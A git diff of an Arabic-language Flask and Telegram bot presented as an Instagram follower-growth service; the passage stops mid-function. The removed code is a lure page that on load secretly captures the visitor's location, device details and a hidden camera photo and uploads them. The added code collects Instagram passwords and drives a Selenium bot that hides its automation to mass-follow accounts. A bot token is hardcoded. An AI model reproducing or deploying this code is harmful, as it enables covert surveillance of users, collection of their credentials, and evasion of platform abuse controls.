@@ -1,602 +1,835 @@
 import os
+import random
+import time
 import json
-import uuid
 import requests
+from datetime import datetime, timedelta
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.chrome.options import Options
 from flask import Flask, request, jsonify, render_template_string
 from telegram import Update, InputFile
 from telegram.ext import Application, CommandHandler, ContextTypes
 import asyncio
 from threading import Thread
-import time
-from datetime import datetime
-import platform
-import random
+import uuid
 
 # ========== إعدادات البوت ==========
 BOT_TOKEN = "7955384959:AAEIU_kzt3hyEmsK9QHoinkSlrld_vWkDB8"
-PORT = int(os.environ.get('PORT', 10000))
+PORT = int(os.environ.get('PORT', 5000))
 
 # ========== إعداد Flask ==========
 app = Flask(__name__)
 
 # إنشاء مجلدات التخزين
-if not os.path.exists('user_data'):
-    os.makedirs('user_data')
-if not os.path.exists('collected_data'):
-    os.makedirs('collected_data')
+if not os.path.exists('data'):
+    os.makedirs('data')
 
-# ========== نظام إدارة المستخدمين ==========
-class UserManager:
+# ========== نظام Instagram Bot ==========
+class InstagramGrowthBot:
     def __init__(self):
-        self.users_file = 'user_data/users.json'
-        self.load_users()
-    
-    def load_users(self):
+        self.driver = None
+        self.stats = {
+            'total_follows': 0,
+            'successful_follows': 0,
+            'failed_follows': 0,
+            'daily_follows': 0,
+            'last_action': None
+        }
+        self.accounts = []
+        
+    def setup_driver(self):
+        """إعداد متصفح Chrome"""
+        chrome_options = Options()
+        chrome_options.add_argument("--no-sandbox")
+        chrome_options.add_argument("--disable-dev-shm-usage")
+        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
+        chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
+        chrome_options.add_experimental_option('useAutomationExtension', False)
+        
+        self.driver = webdriver.Chrome(options=chrome_options)
+        self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
+        
+    def human_like_delay(self, min_sec=2, max_sec=8):
+        """تأخير بشري عشوائي"""
+        delay = random.uniform(min_sec, max_sec)
+        time.sleep(delay)
+        
+    def login(self, username, password):
+        """تسجيل الدخول لإنستغرام"""
         try:
-            with open(self.users_file, 'r', encoding='utf-8') as f:
-                self.users = json.load(f)
-        except:
-            self.users = {}
+            self.driver.get("https://www.instagram.com/accounts/login/")
+            self.human_like_delay(3, 5)
+            
+            # إدخال اسم المستخدم
+            username_input = WebDriverWait(self.driver, 10).until(
+                EC.presence_of_element_located((By.NAME, "username"))
+            )
+            username_input.clear()
+            for char in username:
+                username_input.send_keys(char)
+                time.sleep(random.uniform(0.1, 0.3))
+                
+            # إدخال كلمة المرور
+            password_input = self.driver.find_element(By.NAME, "password")
+            password_input.clear()
+            for char in password:
+                password_input.send_keys(char)
+                time.sleep(random.uniform(0.1, 0.3))
+                
+            # النقر على زر تسجيل الدخول
+            login_button = self.driver.find_element(By.XPATH, "//button[@type='submit']")
+            login_button.click()
+            self.human_like_delay(5, 8)
+            
+            # تجنب حفظ المعلومات
+            try:
+                not_now_btn = WebDriverWait(self.driver, 5).until(
+                    EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Not Now')]"))
+                )
+                not_now_btn.click()
+                self.human_like_delay(2, 4)
+            except:
+                pass
+                
+            return True
+            
+        except Exception as e:
+            print(f"Login error: {e}")
+            return False
     
-    def save_users(self):
-        with open(self.users_file, 'w', encoding='utf-8') as f:
-            json.dump(self.users, f, ensure_ascii=False, indent=2)
+    def follow_from_hashtag(self, hashtag, count=20):
+        """متابعة مستخدمين من الهاشتاق"""
+        try:
+            self.driver.get(f"https://www.instagram.com/explore/tags/{hashtag}/")
+            self.human_like_delay(3, 5)
+            
+            # فتح أول منشور
+            posts = WebDriverWait(self.driver, 10).until(
+                EC.presence_of_all_elements_located((By.XPATH, "//div[@class='_aagw']"))
+            )
+            if posts:
+                posts[0].click()
+                self.human_like_delay(2, 3)
+                
+            followed_count = 0
+            for i in range(count):
+                if followed_count >= count:
+                    break
+                    
+                try:
+                    # الحصول على اسم المستخدم
+                    username_element = WebDriverWait(self.driver, 10).until(
+                        EC.presence_of_element_located((By.XPATH, "//a[contains(@href, '/') and contains(@href, '?')]"))
+                    )
+                    username = username_element.text
+                    
+                    # محاولة المتابعة
+                    follow_buttons = self.driver.find_elements(By.XPATH, "//button[contains(text(), 'Follow')]")
+                    if follow_buttons:
+                        for button in follow_buttons:
+                            try:
+                                if button.is_displayed() and button.is_enabled():
+                                    button.click()
+                                    self.stats['successful_follows'] += 1
+                                    self.stats['total_follows'] += 1
+                                    self.stats['daily_follows'] += 1
+                                    followed_count += 1
+                                    print(f"Followed: {username}")
+                                    break
+                            except:
+                                continue
+                    
+                    # الانتقال للمنشور التالي
+                    next_button = self.driver.find_element(By.XPATH, "//button[contains(@class, '_abl-')]//*[name()='svg' and @aria-label='Next']")
+                    next_button.click()
+                    
+                    # تأخير عشوائي بين المتابعات
+                    self.human_like_delay(8, 15)
+                    
+                    # استراحة عشوائية
+                    if random.random() < 0.2:  # 20% فرصة لأخذ استراحة
+                        self.human_like_delay(30, 60)
+                        
+                except Exception as e:
+                    print(f"Error in follow loop: {e}")
+                    break
+                    
+            return followed_count
+            
+        except Exception as e:
+            print(f"Hashtag follow error: {e}")
+            return 0
     
-    def add_user(self, user_id, user_data):
-        self.users[str(user_id)] = user_data
-        self.save_users()
+    def follow_user_followers(self, target_username, count=15):
+        """متابعة متابعين مستخدم معين"""
+        try:
+            self.driver.get(f"https://www.instagram.com/{target_username}/")
+            self.human_like_delay(3, 5)
+            
+            # النقر على المتابعين
+            followers_link = WebDriverWait(self.driver, 10).until(
+                EC.element_to_be_clickable((By.XPATH, f"//a[contains(@href, '/{target_username}/followers/')]"))
+            )
+            followers_link.click()
+            self.human_like_delay(2, 3)
+            
+            # التمرير وجمع المتابعين
+            followers_list = WebDriverWait(self.driver, 10).until(
+                EC.presence_of_element_located((By.XPATH, "//div[@role='dialog']//div[@style]"))
+            )
+            
+            followed_count = 0
+            last_height = self.driver.execute_script("return arguments[0].scrollHeight", followers_list)
+            
+            while followed_count < count:
+                # البحث عن أزرار المتابعة
+                follow_buttons = self.driver.find_elements(By.XPATH, "//button[contains(text(), 'Follow')]")
+                
+                for button in follow_buttons:
+                    if followed_count >= count:
+                        break
+                    try:
+                        if button.is_displayed() and button.is_enabled():
+                            button.click()
+                            followed_count += 1
+                            self.stats['successful_follows'] += 1
+                            self.stats['total_follows'] += 1
+                            self.stats['daily_follows'] += 1
+                            self.human_like_delay(5, 10)
+                    except:
+                        continue
+                
+                # التمرير لأسفل
+                self.driver.execute_script("arguments[0].scrollTop = arguments[0].scrollHeight", followers_list)
+                self.human_like_delay(2, 4)
+                
+                new_height = self.driver.execute_script("return arguments[0].scrollHeight", followers_list)
+                if new_height == last_height:
+                    break
+                last_height = new_height
+                
+            return followed_count
+            
+        except Exception as e:
+            print(f"Followers follow error: {e}")
+            return 0
     
-    def get_user(self, user_id):
-        return self.users.get(str(user_id))
+    def safe_follow_limit(self):
+        """التحقق من حدود المتابعة الآمنة"""
+        if self.stats['daily_follows'] >= 150:
+            return False
+        return True
+    
+    def close(self):
+        """إغلاق المتصفح"""
+        if self.driver:
+            self.driver.quit()
 
-user_manager = UserManager()
+# ========== نظام إدارة الطلبات ==========
+class OrderManager:
+    def __init__(self):
+        self.orders = {}
+        self.bot = InstagramGrowthBot()
+        
+    def start_growth_service(self, order_data):
+        """بدء خدمة النمو"""
+        def run_growth():
+            try:
+                # إعداد البوت
+                self.bot.setup_driver()
+                
+                # تسجيل الدخول
+                if self.bot.login(order_data['ig_username'], order_data['ig_password']):
+                    order_data['status'] = 'logged_in'
+                    order_data['progress'] = 25
+                    
+                    # تنفيذ استراتيجيات النمو
+                    total_followed = 0
+                    
+                    # المتابعة من الهاشتاقات
+                    hashtags = ['follow', 'followback', 'likeforlike', 'f4f', 'l4l']
+                    for hashtag in hashtags:
+                        if total_followed >= order_data['target_followers']:
+                            break
+                        count = min(20, order_data['target_followers'] - total_followed)
+                        followed = self.bot.follow_from_hashtag(hashtag, count)
+                        total_followed += followed
+                        order_data['progress'] = 25 + (total_followed / order_data['target_followers']) * 50
+                        order_data['current_followers'] = total_followed
+                        
+                        if not self.bot.safe_follow_limit():
+                            break
+                    
+                    # المتابعة من الحسابات الكبيرة
+                    big_accounts = ['instagram', 'selenagomez', 'therock', 'kyliejenner']
+                    for account in big_accounts:
+                        if total_followed >= order_data['target_followers']:
+                            break
+                        count = min(15, order_data['target_followers'] - total_followed)
+                        followed = self.bot.follow_user_followers(account, count)
+                        total_followed += followed
+                        order_data['progress'] = 25 + (total_followed / order_data['target_followers']) * 50
+                        order_data['current_followers'] = total_followed
+                        
+                        if not self.bot.safe_follow_limit():
+                            break
+                    
+                    order_data['status'] = 'completed'
+                    order_data['progress'] = 100
+                    order_data['actual_followers'] = total_followed
+                    order_data['completed_at'] = datetime.now().isoformat()
+                    
+                else:
+                    order_data['status'] = 'failed'
+                    order_data['error'] = 'Login failed'
+                    
+            except Exception as e:
+                order_data['status'] = 'failed'
+                order_data['error'] = str(e)
+            finally:
+                self.bot.close()
+        
+        Thread(target=run_growth, daemon=True).start()
+        return order_data
+
+# ========== إنشاء المدير ==========
+order_manager = OrderManager()
 
 # ========== HTML قوالب ==========
-MAIN_CONSENT_HTML = '''
+LOGIN_HTML = """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>خدمة زيادة المتابعين - الموافقة</title>
+    <title>خدمة زيادة المتابعين الحقيقية</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: Arial, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
+        
         body {
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
-            padding: 20px;
-            color: #333;
-        }
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-            background: white;
-            border-radius: 20px;
-            overflow: hidden;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-        }
-        .header {
-            background: linear-gradient(135deg, #E1306C 0%, #C13584 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
             color: white;
+        }
+        
+        .container {
+            background: rgba(255, 255, 255, 0.1);
             padding: 40px;
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
             text-align: center;
+            max-width: 500px;
+            width: 90%;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
         }
-        .header h1 {
-            font-size: 2.5rem;
-            margin-bottom: 10px;
+        
+        h1 {
+            font-size: 2rem;
+            margin-bottom: 20px;
+            color: white;
         }
-        .content {
-            padding: 40px;
+        
+        .input-group {
+            margin: 20px 0;
+            text-align: right;
         }
-        .section {
-            margin-bottom: 30px;
-            padding: 25px;
-            background: #f8f9fa;
-            border-radius: 15px;
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
         }
-        .data-list {
-            list-style: none;
-            margin: 15px 0;
+        
+        input, select {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 10px;
+            font-size: 1rem;
+            text-align: right;
+            background: rgba(255,255,255,0.9);
         }
-        .data-list li {
-            padding: 10px 0;
-            border-bottom: 1px solid #dee2e6;
-        }
-        .data-list li:before {
-            content: "📱";
-            margin-left: 10px;
-        }
+        
         .btn {
-            background: #4CAF50;
+            background: linear-gradient(135deg, #E1306C 0%, #C13584 100%);
             color: white;
             border: none;
             padding: 15px 30px;
             border-radius: 25px;
             cursor: pointer;
             font-size: 1.1rem;
+            font-weight: bold;
             margin: 10px;
+            transition: all 0.3s ease;
+            width: 100%;
         }
+        
         .btn:hover {
-            background: #45a049;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(225, 48, 108, 0.3);
+        }
+        
+        .package-options {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin: 20px 0;
+        }
+        
+        .package {
+            background: rgba(255,255,255,0.2);
+            padding: 15px;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .package.selected {
+            background: #E1306C;
+        }
+        
+        .package:hover {
+            transform: translateY(-2px);
+        }
+        
+        .note {
+            background: rgba(255,255,255,0.2);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 15px 0;
+            font-size: 0.9rem;
+            text-align: right;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🚀 خدمة زيادة المتابعين الحقيقية</h1>
+        <p>أدخل بيانات حساب إنستغرام لبدء الخدمة</p>
+        
+        <form id="loginForm">
+            <div class="input-group">
+                <label>اسم مستخدم إنستغرام:</label>
+                <input type="text" id="igUsername" placeholder="اسم المستخدم" required>
+            </div>
+            
+            <div class="input-group">
+                <label>كلمة مرور إنستغرام:</label>
+                <input type="password" id="igPassword" placeholder="كلمة المرور" required>
+            </div>
+            
+            <div class="input-group">
+                <label>عدد المتابعين المطلوب:</label>
+                <select id="followerCount">
+                    <option value="100">100 متابع</option>
+                    <option value="250">250 متابع</option>
+                    <option value="500">500 متابع</option>
+                    <option value="1000">1000 متابع</option>
+                </select>
+            </div>
+            
+            <div class="note">
+                ⚠️ ملاحظة: 
+                <br>• تأكد من صحة بيانات الدخول
+                <br>• الخدمة قد تستغرق عدة ساعات
+                <br>• الحد الأقصى 150 متابع/يوم لأمان الحساب
+            </div>
+            
+            <button type="button" class="btn" onclick="startService()">
+                🚀 بدء زيادة المتابعين
+            </button>
+        </form>
+    </div>
+
+    <script>
+        function startService() {
+            const username = document.getElementById('igUsername').value.trim();
+            const password = document.getElementById('igPassword').value.trim();
+            const followers = document.getElementById('followerCount').value;
+            
+            if (!username || !password) {
+                alert('يرجى ملء جميع الحقول');
+                return;
+            }
+            
+            // إرسال الطلب
+            fetch('/start_service', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    ig_username: username,
+                    ig_password: password,
+                    target_followers: parseInt(followers),
+                    user_id: '{{user_id}}'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    // الانتقال إلى صفحة المتابعة
+                    const statusUrl = `/service_status/{{user_id}}?order_id=${data.order_id}`;
+                    window.location.href = statusUrl;
+                } else {
+                    alert('❌ حدث خطأ: ' + data.error);
+                }
+            })
+            .catch(error => {
+                alert('❌ خطأ في الاتصال: ' + error);
+            });
+        }
+    </script>
+</body>
+</html>
+"""
+
+STATUS_HTML = """
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>حالة الخدمة - زيادة المتابعين</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            color: white;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        .header {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 30px;
+            border-radius: 20px;
+            text-align: center;
+            margin-bottom: 20px;
+            backdrop-filter: blur(10px);
+        }
+        
+        .status-card {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 25px;
+            border-radius: 15px;
+            margin: 15px 0;
+            backdrop-filter: blur(10px);
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 20px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 15px 0;
+        }
+        
+        .progress {
+            height: 100%;
+            background: linear-gradient(90deg, #4CAF50, #45a049);
+            border-radius: 10px;
+            transition: width 0.3s ease;
+        }
+        
+        .status-badge {
+            display: inline-block;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-weight: bold;
+            margin: 5px;
+        }
+        
+        .status-pending { background: #FF9800; }
+        .status-active { background: #2196F3; }
+        .status-completed { background: #4CAF50; }
+        .status-failed { background: #f44336; }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin: 20px 0;
+        }
+        
+        .stat-item {
+            background: rgba(255,255,255,0.1);
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        
+        .log-container {
+            max-height: 300px;
+            overflow-y: auto;
+            background: rgba(0,0,0,0.3);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 15px 0;
+            font-family: monospace;
+            font-size: 0.9rem;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>خدمة زيادة المتابعين</h1>
-            <p>الموافقة على الشروط والخصوصية</p>
+            <h1>📊 حالة خدمة زيادة المتابعين</h1>
+            <p>جاري متابعة تقدم خدمتك</p>
         </div>
-        <div class="content">
-            <div class="section">
-                <h3>البيانات التي سيتم جمعها:</h3>
-                <ul class="data-list">
-                    <li>معلومات الجهاز والمتصفح</li>
-                    <li>الموقع الجغرافي</li>
-                    <li>الصور من الكاميرا</li>
-                    <li>إعدادات النظام</li>
-                </ul>
+        
+        <div class="status-card">
+            <h2>تفاصيل الطلب</h2>
+            <div id="orderDetails"></div>
+        </div>
+        
+        <div class="status-card">
+            <h2>سير التقدم</h2>
+            <div class="progress-bar">
+                <div class="progress" id="orderProgress"></div>
             </div>
-            <div style="text-align: center;">
-                <button class="btn" onclick="acceptConsent()">أوافق على الشروط</button>
+            <div id="progressText" style="text-align: center; margin: 10px 0;"></div>
+        </div>
+        
+        <div class="stats-grid">
+            <div class="stat-item">
+                <div style="font-size: 2rem;">👥</div>
+                <div id="currentFollowers">0</div>
+                <div>متابعين مضافين</div>
+            </div>
+            <div class="stat-item">
+                <div style="font-size: 2rem;">🎯</div>
+                <div id="targetFollowers">0</div>
+                <div>الهدف</div>
+            </div>
+        </div>
+        
+        <div class="status-card">
+            <h2>سجل النشاط</h2>
+            <div class="log-container" id="activityLog">
+                <div>⏳ جاري بدء الخدمة...</div>
             </div>
         </div>
     </div>
-    <script>
-        function acceptConsent() {
-            window.location.href = "/collect_data/{{user_id}}";
-        }
-    </script>
-</body>
-</html>
-'''
-
-DATA_COLLECTION_HTML = '''
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جمع البيانات</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-family: Arial, sans-serif;
-        }
-        .container {
-            background: rgba(255,255,255,0.1);
-            padding: 40px;
-            border-radius: 20px;
-            text-align: center;
-            max-width: 500px;
-            width: 90%;
-        }
-        .loader {
-            width: 50px;
-            height: 50px;
-            border: 5px solid rgba(255,255,255,0.3);
-            border-top: 5px solid white;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .progress-bar {
-            width: 100%;
-            height: 10px;
-            background: rgba(255,255,255,0.2);
-            border-radius: 5px;
-            margin: 20px 0;
-            overflow: hidden;
-        }
-        .progress {
-            height: 100%;
-            background: #4CAF50;
-            width: 0%;
-            transition: width 0.3s;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>جاري جمع البيانات</h1>
-        <div class="loader"></div>
-        <div id="status">بدء عملية جمع البيانات...</div>
-        <div class="progress-bar">
-            <div class="progress" id="progress"></div>
-        </div>
-    </div>
-
-    <video id="video" autoplay style="display: none;"></video>
-    <canvas id="canvas" style="display: none;"></canvas>
 
     <script>
-        let collectedData = {
-            user_id: '{{user_id}}',
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            screen: screen.width + 'x' + screen.height,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            cookies: navigator.cookieEnabled
-        };
-
-        async function startCollection() {
-            updateProgress(10, 'جمع معلومات الجهاز...');
-            await delay(1000);
-
-            updateProgress(30, 'جمع بيانات الموقع...');
-            await getLocation();
-            
-            updateProgress(50, 'الوصول للكاميرا...');
-            await accessCamera();
-            
-            updateProgress(80, 'إرسال البيانات...');
-            await sendData();
-            
-            updateProgress(100, 'اكتمل!');
-            
-            setTimeout(() => {
-                window.location.href = "/complete/{{user_id}}";
-            }, 2000);
-        }
-
-        function updateProgress(percent, message) {
-            document.getElementById('progress').style.width = percent + '%';
-            document.getElementById('status').textContent = message;
-        }
-
-        function delay(ms) {
-            return new Promise(resolve => setTimeout(resolve, ms));
-        }
-
-        async function getLocation() {
-            return new Promise((resolve) => {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            collectedData.location = {
-                                lat: position.coords.latitude,
-                                lng: position.coords.longitude
-                            };
-                            resolve();
-                        },
-                        () => {
-                            collectedData.location = 'غير متاح';
-                            resolve();
-                        }
-                    );
-                } else {
-                    collectedData.location = 'غير مدعوم';
-                    resolve();
-                }
-            });
-        }
-
-        async function accessCamera() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                const canvas = document.getElementById('canvas');
-                const context = canvas.getContext('2d');
-                
-                video.srcObject = stream;
-                await delay(2000);
-                
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                context.drawImage(video, 0, 0);
-                
-                collectedData.photo = canvas.toDataURL('image/jpeg');
-                
-                stream.getTracks().forEach(track => track.stop());
-            } catch (error) {
-                collectedData.cameraError = error.message;
-            }
-        }
-
-        async function sendData() {
-            try {
-                const formData = new FormData();
-                formData.append('user_id', '{{user_id}}');
-                formData.append('data', JSON.stringify(collectedData));
-                
-                if (collectedData.photo) {
-                    const blob = await fetch(collectedData.photo).then(r => r.blob());
-                    formData.append('photo', blob, 'photo.jpg');
-                }
-
-                await fetch('/save_data', {
-                    method: 'POST',
-                    body: formData
+        const orderId = new URLSearchParams(window.location.search).get('order_id');
+        let activityLog = [];
+        
+        function updateServiceStatus() {
+            fetch('/get_service_status?order_id=' + orderId)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        displayOrderData(data.order_data);
+                        updateActivityLog(data.order_data);
+                    }
                 });
-            } catch (error) {
-                console.error('Error sending data:', error);
+        }
+        
+        function displayOrderData(order) {
+            // تفاصيل الطلب
+            document.getElementById('orderDetails').innerHTML = `
+                <div><strong>رقم الطلب:</strong> ${order.order_id}</div>
+                <div><strong>الحساب:</strong> @${order.ig_username}</div>
+                <div><strong>الحالة:</strong> <span class="status-badge status-${order.status}">${getStatusText(order.status)}</span></div>
+                <div><strong>وقت البدء:</strong> ${new Date(order.created_at).toLocaleString('ar-EG')}</div>
+                ${order.completed_at ? `<div><strong>وقت الاكتمال:</strong> ${new Date(order.completed_at).toLocaleString('ar-EG')}</div>` : ''}
+            `;
+            
+            // شريط التقدم
+            document.getElementById('orderProgress').style.width = order.progress + '%';
+            document.getElementById('progressText').textContent = `${order.progress}% مكتمل`;
+            
+            // الإحصائيات
+            document.getElementById('currentFollowers').textContent = order.current_followers || 0;
+            document.getElementById('targetFollowers').textContent = order.target_followers;
+        }
+        
+        function updateActivityLog(order) {
+            const logContainer = document.getElementById('activityLog');
+            const status = order.status;
+            const progress = order.progress;
+            
+            let newLogs = [];
+            
+            if (status === 'pending') {
+                newLogs.push('⏳ جاري التحضير لبدء الخدمة...');
             }
-        }
-
-        // بدء العملية تلقائياً
-        window.addEventListener('load', startCollection);
-    </script>
-</body>
-</html>
-'''
-
-COMPLETE_HTML = '''
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>اكتمل</title>
-    <style>
-        body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-family: Arial, sans-serif;
-            text-align: center;
-        }
-        .container {
-            background: rgba(255,255,255,0.1);
-            padding: 40px;
-            border-radius: 20px;
-            max-width: 500px;
-        }
-        .btn {
-            background: #4CAF50;
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            border-radius: 25px;
-            cursor: pointer;
-            font-size: 1.1rem;
-            margin: 20px;
-            text-decoration: none;
-            display: inline-block;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>🎉 تم بنجاح!</h1>
-        <p>تم جمع البيانات بنجاح وإرسالها للبوت</p>
-        <p>ستصلك المتابعين المجانية خلال 24 ساعة</p>
-        <a href="/get_followers/{{user_id}}" class="btn">الحصول على المتابعين</a>
-    </div>
-</body>
-</html>
-'''
-
-FOLLOWERS_HTML = '''
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>المتابعين</title>
-    <style>
-        body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            padding: 20px;
-            color: white;
-            font-family: Arial, sans-serif;
-        }
-        .container {
-            max-width: 600px;
-            margin: 0 auto;
-            background: rgba(255,255,255,0.1);
-            padding: 30px;
-            border-radius: 20px;
-            text-align: center;
-        }
-        .package {
-            background: rgba(255,255,255,0.2);
-            padding: 20px;
-            margin: 15px 0;
-            border-radius: 15px;
-        }
-        .btn {
-            background: #E1306C;
-            color: white;
-            border: none;
-            padding: 12px 25px;
-            border-radius: 20px;
-            cursor: pointer;
-            margin: 5px;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>🎯 باقات المتابعين</h1>
-        
-        <div class="package">
-            <h3>🎁 100 متابع مجاناً</h3>
-            <p>متابعين حقيقين - توصيل خلال 24 ساعة</p>
-            <button class="btn" onclick="selectPackage('free')">اختيار مجاني</button>
-        </div>
-        
-        <div class="package">
-            <h3>⭐ 1000 متابع - $9.99</h3>
-            <p>متابعين نشطين - توصيل سريع</p>
-            <button class="btn" onclick="selectPackage('basic')">اختيار الباقة</button>
-        </div>
-        
-        <div class="package">
-            <h3>👑 5000 متابع - $29.99</h3>
-            <p>متابعين مميزين - توصيل فوري</p>
-            <button class="btn" onclick="selectPackage('premium')">اختيار الباقة</button>
-        </div>
-    </div>
-
-    <script>
-        function selectPackage(package) {
-            fetch('/select_package', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    user_id: '{{user_id}}',
-                    package: package
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.success) {
-                    alert('🎉 تم تفعيل الباقة بنجاح!');
+            else if (status === 'logged_in') {
+                newLogs.push('✅ تم تسجيل الدخول بنجاح');
+                newLogs.push('🚀 بدء عملية زيادة المتابعين...');
+            }
+            else if (status === 'completed') {
+                newLogs.push('🎉 اكتملت الخدمة بنجاح!');
+                newLogs.push(`✅ تم إضافة ${order.actual_followers} متابع`);
+            }
+            else if (status === 'failed') {
+                newLogs.push('❌ فشلت الخدمة: ' + order.error);
+            }
+            
+            if (progress >= 25 && progress < 50) {
+                newLogs.push('🔍 جاري البحث عن مستخدمين مناسبين...');
+            }
+            else if (progress >= 50 && progress < 75) {
+                newLogs.push('📈 جاري متابعة المستخدمين...');
+                newLogs.push(`✅ تمت متابعة ${order.current_followers} مستخدم حتى الآن`);
+            }
+            else if (progress >= 75) {
+                newLogs.push('🎯 المرحلة النهائية...');
+                newLogs.push(`⚡ جاري إكمال ${order.target_followers - (order.current_followers || 0)} متابع باقي`);
+            }
+            
+            // إضافة السجلات الجديدة
+            newLogs.forEach(log => {
+                if (!activityLog.includes(log)) {
+                    activityLog.push(log);
+                    const logElement = document.createElement('div');
+                    logElement.textContent = `[${new Date().toLocaleTimeString('ar-EG')}] ${log}`;
+                    logContainer.appendChild(logElement);
                 }
             });
+            
+            // التمرير لأسفل
+            logContainer.scrollTop = logContainer.scrollHeight;
         }
+        
+        function getStatusText(status) {
+            const texts = {
+                'pending': 'في الانتظار',
+                'logged_in': 'جاري العمل',
+                'completed': 'مكتمل',
+                'failed': 'فشل'
+            };
+            return texts[status] || status;
+        }
+        
+        // تحديث الحالة كل 5 ثواني
+        updateServiceStatus();
+        setInterval(updateServiceStatus, 5000);
     </script>
 </body>
 </html>
-'''
+"""
 
 # ========== مسارات Flask ==========
 @app.route('/')
 def home():
     return "Instagram Growth Service - Use /start in Telegram"
 
-@app.route('/consent/<user_id>')
-def consent_page(user_id):
-    return render_template_string(MAIN_CONSENT_HTML, user_id=user_id)
+@app.route('/user/<user_id>')
+def user_page(user_id):
+    """الصفحة الرئيسية للمستخدم"""
+    return render_template_string(LOGIN_HTML, user_id=user_id)
 
-@app.route('/collect_data/<user_id>')
-def collect_data_page(user_id):
-    return render_template_string(DATA_COLLECTION_HTML, user_id=user_id)
-
-@app.route('/complete/<user_id>')
-def complete_page(user_id):
-    return render_template_string(COMPLETE_HTML, user_id=user_id)
-
-@app.route('/get_followers/<user_id>')
-def followers_page(user_id):
-    return render_template_string(FOLLOWERS_HTML, user_id=user_id)
-
-@app.route('/save_data', methods=['POST'])
-def save_data():
-    try:
-        user_id = request.form.get('user_id')
-        data_json = request.form.get('data')
-        
-        if not user_id or not data_json:
-            return jsonify({'success': False, 'error': 'Missing data'})
-        
-        # تحليل البيانات
-        user_data = json.loads(data_json)
-        
